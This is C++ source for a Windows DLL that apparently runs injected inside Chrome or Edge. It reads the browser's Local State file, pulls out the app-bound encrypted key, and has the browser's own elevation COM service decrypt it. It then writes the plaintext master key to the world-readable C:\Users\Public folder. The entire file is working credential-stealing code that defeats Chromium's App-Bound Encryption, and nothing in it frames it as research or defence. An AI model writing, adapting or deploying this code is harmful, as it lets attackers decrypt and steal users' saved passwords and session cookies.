#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <vector>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

static const CLSID CLSID_ChromeElevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
static const IID IID_Chrome_IElevator  = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
static const IID IID_Chrome_IElevator2 = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

static const CLSID CLSID_EdgeElevator = {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}};
static const IID IID_Edge_IElevator  = {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
static const IID IID_Edge_IElevator2 = {0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}};

struct IElevatorChrome : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

struct IElevatorEdge : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Placeholder1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Placeholder2() = 0;
    virtual HRESULT STDMETHODCALLTYPE Placeholder3() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

static std::vector<BYTE> Base64Decode(const std::string& encoded) {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> out; int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (c == '=') break;
        auto pos = chars.find((char)c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + (int)pos; valb += 6;
        if (valb >= 0) { out.push_back((BYTE)((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

static std::string ExtractAppBoundKey(const std::string& json) {
    const std::string key = "\"app_bound_encrypted_key\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + key.length());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";
    size_t start = pos + 1;
    size_t end = json.find('"', start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

static bool IsEdgeProcess() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring p = exePath;
    for (auto& c : p) if (c >= L'A' && c <= L'Z') c = (wchar_t)(c + 32);
    return p.find(L"msedge.exe") != std::wstring::npos;
}

DWORD WINAPI WorkerThread(LPVOID) {
    bool isEdge = IsEdgeProcess();
    const char* keyPath = isEdge ? "C:\\Users\\Public\\edge_abe_key.bin" : "C:\\Users\\Public\\chrome_abe_key.bin";
    const wchar_t* localStateSub = isEdge ? L"\\Microsoft\\Edge\\User Data\\Local State" : L"\\Google\\Chrome\\User Data\\Local State";

    if (GetFileAttributesA(keyPath) != INVALID_FILE_ATTRIBUTES) return 0;
    HANDLE hMutex = CreateMutexW(nullptr, FALSE, L"Local\\ChromiumAbeKeyMutex");
    if (hMutex) WaitForSingleObject(hMutex, 5000);

    if (GetFileAttributesA(keyPath) == INVALID_FILE_ATTRIBUTES) {
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        PWSTR localAppData = nullptr;
        SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
        if (localAppData) {
            std::wstring statePath = std::wstring(localAppData) + localStateSub;
            CoTaskMemFree(localAppData);
            std::ifstream f(statePath, std::ios::binary);
            if (f) {
                std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                std::string b64 = ExtractAppBoundKey(content);
                if (!b64.empty()) {
                    auto blob = Base64Decode(b64);
                    if (blob.size() > 4) blob.erase(blob.begin(), blob.begin() + 4);
                    BSTR cipher = SysAllocStringByteLen((const char*)blob.data(), (UINT)blob.size());
                    if (cipher) {
                        BSTR plain = nullptr; DWORD lastError = 0;
                        HRESULT hr = E_FAIL;
                        if (isEdge) {
                            IElevatorEdge* e = nullptr;
                            hr = CoCreateInstance(CLSID_EdgeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Edge_IElevator2, (void**)&e);
                            if (FAILED(hr)) hr = CoCreateInstance(CLSID_EdgeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Edge_IElevator, (void**)&e);
                            if (SUCCEEDED(hr) && e) {
                                CoSetProxyBlanket(e, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                                hr = e->DecryptData(cipher, &plain, &lastError);
                                e->Release();
                            }
                        } else {
                            IElevatorChrome* e = nullptr;
                            hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Chrome_IElevator2, (void**)&e);
                            if (FAILED(hr)) hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Chrome_IElevator, (void**)&e);
                            if (SUCCEEDED(hr) && e) {
                                CoSetProxyBlanket(e, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                                hr = e->DecryptData(cipher, &plain, &lastError);
                                e->Release();
                            }
                        }
                        if (SUCCEEDED(hr) && plain) {
                            std::ofstream out(keyPath, std::ios::binary);
                            out.write((const char*)plain, SysStringByteLen(plain));
                        }
                        if (plain) SysFreeString(plain);
                        SysFreeString(cipher);
                    }
                }
            }
        }
        CoUninitialize();
    }
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI TriggerDecryption(LPVOID) {
    return WorkerThread(nullptr);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
    return TRUE;
}